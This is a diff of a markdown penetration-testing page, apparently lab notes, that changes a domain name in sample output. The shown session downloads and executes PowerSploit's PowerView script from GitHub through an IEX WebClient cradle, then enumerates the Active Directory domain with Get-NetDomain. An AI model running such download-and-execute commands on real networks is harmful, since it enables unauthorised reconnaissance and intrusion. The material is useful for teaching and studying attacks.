@@ -29,16 +29,16 @@ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\windows\system32\inetsrv>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 PS C:\windows\system32\inetsrv> Get-NetDomain
 
-Forest                  : spartancybersec.corp
-DomainControllers       : {First-DC.spartancybersec.corp}
+Forest                  : evilcorpt.corp
+DomainControllers       : {First-DC.evilcorpt.corp}
 Children                : {}
 DomainMode              : Unknown
 DomainModeLevel         : 7
 Parent                  : 
-PdcRoleOwner            : First-DC.spartancybersec.corp
-RidRoleOwner            : First-DC.spartancybersec.corp
-InfrastructureRoleOwner : First-DC.spartancybersec.corp
-Name                    : spartancybersec.corp
+PdcRoleOwner            : First-DC.evilcorpt.corp
+RidRoleOwner            : First-DC.evilcorpt.corp
+InfrastructureRoleOwner : First-DC.evilcorpt.corp
+Name                    : evilcorpt.corp
 ```
 {% endcode %}
 
